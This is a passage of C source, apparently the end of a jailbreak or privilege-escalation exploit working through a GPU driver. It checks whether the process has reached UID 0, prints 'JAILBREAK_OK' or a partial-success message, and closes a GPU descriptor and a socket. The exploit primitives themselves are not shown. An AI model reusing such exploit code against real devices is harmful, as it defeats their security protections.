        if(suid == 0 && (uid_dmap & 0xFFFFFFFFULL) == 0)
            S("*** JAILBREAK_OK ***\n");
        else if((uid_dmap & 0xFFFFFFFFULL) == 0)
            S("uid_dmap=0 mais getuid!=0 (cache?)\n");
        else
            S("jailbreak_partial\n");
        FL();
    }

done:
    if(g_gpu.fd>=0) close(g_gpu.fd);
    S("--- DONE ---\n"); FL();
    if(g_sock>=0) close(g_sock);
    return 0;
}
